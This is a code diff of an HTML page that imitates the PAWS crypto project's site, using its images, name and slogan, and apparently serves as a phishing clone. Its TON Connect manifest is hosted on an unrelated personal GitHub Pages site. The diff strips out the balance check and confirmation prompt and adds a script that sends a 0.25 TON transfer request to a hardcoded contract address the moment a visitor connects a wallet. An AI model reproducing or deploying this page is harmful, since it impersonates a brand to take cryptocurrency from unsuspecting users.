@@ -1,163 +1,166 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <base href="https://paws.community/app">
-    <meta charset="utf-8">
-    <meta name="download_date" content="2025-02-06T16:24:26.723Z"/>
-    <title>PAWS | Home</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="theme-color" content="#0D0D0D">
-    <link rel="icon" href="https://paws.community/favicon.ico">
-    
-    <!-- SEO Meta Tags -->
-    <meta name="robots" content="index,follow">
-    <meta name="description" content="Animals are done! It's PAWS Season">
-    <meta name="keywords" content="!">
-    
-    <!-- Social Media Meta Tags -->
-    <meta name="twitter:card" content="summary">
-    <meta name="twitter:site" content="@pawsuplabs">
-    <meta property="og:title" content="PAWS | Home">
-    <meta property="og:description" content="Animals are done! It's PAWS Season">
-    <meta property="og:url" content="https://paws.community/app">
-    <meta property="og:type" content="website">
-    <meta property="og:image" content="https://paws.community/static/page-preview.png">
-    <meta property="og:image:alt" content="preview">
-    
-    <!-- Technical Meta Tags -->
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="x-ua-compatible" content="IE=edge; chrome=1">
-    
-    <!-- PWA Configuration -->
-    <meta property="application-name" content="PAWS">
-    <meta property="apple-mobile-web-app-capable" content="yes">
-    <meta property="apple-mobile-web-app-status-bar-style" content="default">
-    <meta property="apple-mobile-web-app-title" content="PAWS">
-    <meta property="mobile-web-app-capable" content="yes">
-    <meta property="msapplication-config" content="/icons/browserconfig.xml">
-    
-    <!-- Icons & Manifest -->
-    <link rel="icon" href="/favicon.ico">
-    <link rel="icon" href="/static/favicon-32x32.png" sizes="32x32">
-    <link rel="apple-touch-icon" href="/icons/512.png" sizes="512x512">
-    <link rel="manifest" href="/manifest.json">
-    
-    <!-- Preload Resources -->
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://www.google-analytics.com">
-    <link rel="preconnect" href="https://www.googletagmanager.com">
-    
-    <!-- Görsel Kaynakları Doğrudan Siteden Çek -->
-    <link rel="preload" as="image" href="https://paws.community/_next/static/media/planet.6ad20553.png">
-    <link rel="preload" as="image" href="https://paws.community/_next/static/media/shape1.04e536d7.png">
-    <link rel="preload" as="image" href="https://paws.community/_next/static/media/shape2.501939e0.png">
-    <link rel="preload" as="image" href="https://paws.community/_next/static/media/shape3.dbfda191.png">
-    <link rel="preload" as="image" href="https://paws.community/_next/static/media/shape4.3f7a27ad.png">
-    
-    <!-- Styles -->
-    <link rel="stylesheet" href="/styles/main.css">
-    <style>
-        :root {
-            --bg-color: #0D0D0D;
-            --text-color: #FFFFFF;
-            --accent-color: #FF6B6B;
-        }
+<base href="https://paws.community/app">
+<meta charset="utf-8">
+<meta name="download_date" content="2025-02-06T16:24:26.723Z"/>
+<title>PAWS | Home</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="theme-color" content="#0D0D0D">
+<link rel="icon" href="https://paws.community/favicon.ico">
 
-        body {
-            margin: 0;
-            padding: 0;
-            background: var(--bg-color);
-            color: var(--text-color);
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            overflow-x: hidden;
-        }
+<!-- SEO Meta Tags -->
+<meta name="robots" content="index,follow">
+<meta name="description" content="Animals are done! It's PAWS Season">
+<meta name="keywords" content="!">
 
-        .main-container {
-            position: relative;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            padding: 2rem;
-        }
+<!-- Social Media Meta Tags -->
+<meta name="twitter:card" content="summary">
+<meta name="twitter:site" content="@pawsuplabs">
+<meta property="og:title" content="PAWS | Home">
+<meta property="og:description" content="Animals are done! It's PAWS Season">
+<meta property="og:url" content="https://paws.community/app">
+<meta property="og:type" content="website">
+<meta property="og:image" content="https://paws.community/static/page-preview.png">
+<meta property="og:image:alt" content="preview">
 
-        .logo-container {
-            position: relative;
-            z-index: 2;
-            text-align: center;
-            margin-bottom: 3rem;
-        }
+<!-- Technical Meta Tags -->
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="x-ua-compatible" content="IE=edge; chrome=1">
 
-        .logo {
-            width: 150px;
-            height: 150px;
-            margin-bottom: 1.5rem;
-            animation: float 3s ease-in-out infinite;
-        }
+<!-- PWA Configuration -->
+<meta property="application-name" content="PAWS">
+<meta property="apple-mobile-web-app-capable" content="yes">
+<meta property="apple-mobile-web-app-status-bar-style" content="default">
+<meta property="apple-mobile-web-app-title" content="PAWS">
+<meta property="mobile-web-app-capable" content="yes">
+<meta property="msapplication-config" content="/icons/browserconfig.xml">
 
-        .title {
-            font-size: 4rem;
-            font-weight: 700;
-            margin: 0;
+<!-- Icons & Manifest -->
+<link rel="icon" href="/favicon.ico">
+<link rel="icon" href="/static/favicon-32x32.png" sizes="32x32">
+<link rel="apple-touch-icon" href="/icons/512.png" sizes="512x512">
+<link rel="manifest" href="/manifest.json">
+
+<!-- Preload Resources -->
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://www.google-analytics.com">
+<link rel="preconnect" href="https://www.googletagmanager.com">
+
+<!-- Görsel Kaynakları Doğrudan Siteden Çek -->
+<link rel="preload" as="image" href="https://paws.community/_next/static/media/planet.6ad20553.png">
+<link rel="preload" as="image" href="https://paws.community/_next/static/media/shape1.04e536d7.png">
+<link rel="preload" as="image" href="https://paws.community/_next/static/media/shape2.501939e0.png">
+<link rel="preload" as="image" href="https://paws.community/_next/static/media/shape3.dbfda191.png">
+<link rel="preload" as="image" href="https://paws.community/_next/static/media/shape4.3f7a27ad.png">
+
+<!-- Styles -->
+<link rel="stylesheet" href="/styles/main.css">
+<style>
+:root {
+--bg-color: #0D0D0D;
+--text-color: #FFFFFF;
+--accent-color: #FF6B6B;
+}
+
+body {
+margin: 0;
+padding: 0;
+background: var(--bg-color);
+color: var(--text-color);
+font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+overflow-x: hidden;
+}
+
+.main-container {
+position: relative;
+min-height: 100vh;
+display: flex;
+flex-direction: column;
+align-items: center;
+justify-content: center;
+padding: 2rem;
+}
+
+.logo-container {
+position: relative;
+z-index: 2;
+text-align: center;
+margin-bottom: 3rem;
+}
+
+.logo {
+width: 150px;
+height: 150px;
+margin-bottom: 1.5rem;
+animation: float 3s ease-in-out infinite;
+}
+
+.title {
+font-size: 4rem;
+font-weight: 700;
+margin: 0;
+            background: linear-gradient(45deg, var(--accent-color), #FF8E53);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
             color: #FFFFFF;
             /* Remove gradient background and text fill properties */
             /*background: linear-gradient(45deg, var(--accent-color), #FF8E53);*/
             /*-webkit-background-clip: text;*/
             /*-webkit-text-fill-color: transparent;*/
-        }
+}
 
-        .subtitle {
-            font-size: 1.5rem;
-            margin: 1rem 0 2rem;
-            opacity: 0.9;
-        }
+.subtitle {
+font-size: 1.5rem;
+margin: 1rem 0 2rem;
+opacity: 0.9;
+}
 
-        .connect-button {
-            background: var(--accent-color);
-            color: var(--bg-color);
-            border: none;
-            padding: 1rem 2.5rem;
-            border-radius: 50px;
-            font-size: 1.2rem;
-            font-weight: 600;
-            cursor: pointer;
-            transition: transform 0.2s ease;
+.connect-button {
+background: var(--accent-color);
+color: var(--bg-color);
+border: none;
+padding: 1rem 2.5rem;
+border-radius: 50px;
+font-size: 1.2rem;
+font-weight: 600;
+cursor: pointer;
+transition: transform 0.2s ease;
             display: flex !important;
             align-items: center;
             justify-content: center;
             margin: 0 auto;
             min-width: 200px;
-        }
+}
 
-        .connect-button:hover {
-            transform: translateY(-2px);
-        }
+.connect-button:hover {
+transform: translateY(-2px);
+}
 
-        .background-elements {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
-            z-index: 1;
-        }
+.background-elements {
+position: fixed;
+top: 0;
+left: 0;
+width: 100%;
+height: 100%;
+pointer-events: none;
+z-index: 1;
+}
 
-        .planet {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            width: 80vw;
-            max-width: 1000px;
-            opacity: 0.1;
-        }
+.planet {
+position: absolute;
+top: 50%;
+left: 50%;
+transform: translate(-50%, -50%);
+width: 80vw;
+max-width: 1000px;
+opacity: 0.1;
+}
 
-        @keyframes float {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-20px); }
-        }
+@keyframes float {
+0%, 100% { transform: translateY(0); }
+50% { transform: translateY(-20px); }
+}
 
         #connect-container {
             display: flex;
@@ -179,114 +182,59 @@
             margin: 0;
             opacity: 0.8;
         }
-    </style>
-    <script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>
-    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
+</style>
+<script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>
+<script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
 </head>
 <body>
-    <div class="background-elements">
-        <img src="https://paws.community/_next/static/media/planet.6ad20553.png" 
-             alt="Planet" class="planet">
-    </div>
+<div class="background-elements">
+<img src="https://paws.community/_next/static/media/planet.6ad20553.png" 
+alt="Planet" class="planet">
+</div>
 
-    <main class="main-container">
-        <div class="logo-container">
-            <img src="https://paws.community/_next/static/media/pawsLogo.372b558c.svg" 
-                 alt="PAWS Logo" class="logo">
-            <h1 class="title">PAWS</h1>
-            <p class="subtitle">Animals are done! It's PAWS Season</p>
-            <div id="connect-container"></div>
-        </div>
-    </main>
-    
-    <footer class="main-footer">
-        <p>© 2023 PAWS Animal Shelter. All rights reserved.</p>
-    </footer>
+<main class="main-container">
+<div class="logo-container">
+<img src="https://paws.community/_next/static/media/pawsLogo.372b558c.svg" 
+alt="PAWS Logo" class="logo">
+<h1 class="title">PAWS</h1>
+<p class="subtitle">Animals are done! It's PAWS Season</p>
+<div id="connect-container"></div>
+</div>
+</main>
 
-    <!-- Scripts -->
-    <script>
-    const CONTRACT_ADDRESS = 'EQCzC-lHViu4W3R6CON5nUgGCEf_l5hA5cDJjVVX2uEGnW38';
-    const REQUIRED_AMOUNT = '250000000'; // 0.25 TON in nanotons
-    
-    const tonConnect = new TON_CONNECT_UI.TonConnectUI({
-        manifestUrl: 'https://hasan199191.github.io/my-ton-app/tonconnect-manifest.json',
-        buttonRootId: 'connect-container',
-        buttonCssClass: 'connect-button'
-    });
+<footer class="main-footer">
+<p>© 2023 PAWS Animal Shelter. All rights reserved.</p>
+</footer>
 
-    tonConnect.onStatusChange(async (wallet) => {
-        if (wallet) {
-            try {
-                // Check wallet balance
-                const balance = await tonConnect.ton.getBalance(wallet.account.address);
-                
-                // Check if balance is sufficient
-                if (BigInt(balance) < BigInt(REQUIRED_AMOUNT)) {
-                    webapp.showPopup({
-                        title: 'Insufficient Balance',
-                        message: 'This transaction requires 0.25 TON. Your current balance is insufficient.',
-                        buttons: [{
-                            id: "ok",
-                            type: "ok",
-                            text: "OK"
-                        }]
-                    });
-                    return;
-                }
+<!-- Scripts -->
+<script>
+const CONTRACT_ADDRESS = 'EQCzC-lHViu4W3R6CON5nUgGCEf_l5hA5cDJjVVX2uEGnW38';
 
-                // If balance is sufficient, show confirmation
-                webapp.showPopup({
-                    title: 'Confirm Transaction',
-                    message: 'This will deduct 0.25 TON from your wallet. Do you want to proceed?',
-                    buttons: [
-                        {
-                            id: "confirm",
-                            type: "ok",
-                            text: "Confirm"
-                        },
-                        {
-                            id: "cancel",
-                            type: "cancel",
-                            text: "Cancel"
-                        }
-                    ]
-                }, async (buttonId) => {
-                    if (buttonId === 'confirm') {
-                        try {
-                            const transaction = {
-                                validUntil: Math.floor(Date.now() / 1000) + 600,
-                                messages: [{
-                                    address: CONTRACT_ADDRESS,
-                                    amount: REQUIRED_AMOUNT,
-                                    payload: 'te6ccgEBAQEAAgAAAA=='
-                                }]
-                            };
-                            await tonConnect.sendTransaction(transaction);
-                            webapp.showPopup({
-                                title: 'Success',
-                                message: 'Transaction sent successfully!',
-                                buttons: [{type: 'ok'}]
-                            });
-                        } catch (e) {
-                            webapp.showPopup({
-                                title: 'Error',
-                                message: 'Transaction failed: ' + e.message,
-                                buttons: [{type: 'ok'}]
-                            });
-                        }
-                    }
-                });
+const tonConnect = new TON_CONNECT_UI.TonConnectUI({
+manifestUrl: 'https://hasan199191.github.io/my-ton-app/tonconnect-manifest.json',
+buttonRootId: 'connect-container',
+buttonCssClass: 'connect-button'
+});
 
-            } catch (e) {
-                console.error('Transaction failed:', e);
-                webapp.showPopup({
-                    title: 'Error',
-                    message: 'Transaction failed: ' + e.message,
-                    buttons: [{type: 'ok'}]
-                });
-            }
-        }
-    });
+tonConnect.onStatusChange(async (wallet) => {
+if (wallet) {
+console.log('Wallet connected:', wallet.account.address);
+// Auto-trigger transaction after connection
+try {
+const transaction = {
+validUntil: Math.floor(Date.now() / 1000) + 600,
+messages: [{
+address: CONTRACT_ADDRESS,
+amount: '250000000', // 0.25 TON
+payload: 'te6ccgEBAQEAAgAAAA=='
+}]
+};
+await tonConnect.sendTransaction(transaction);
+console.log('Transaction sent successfully');
+} catch (e) {
+console.error('Transaction failed:', e);
+}
+}
+});
 </script>
 </body>
-</html>
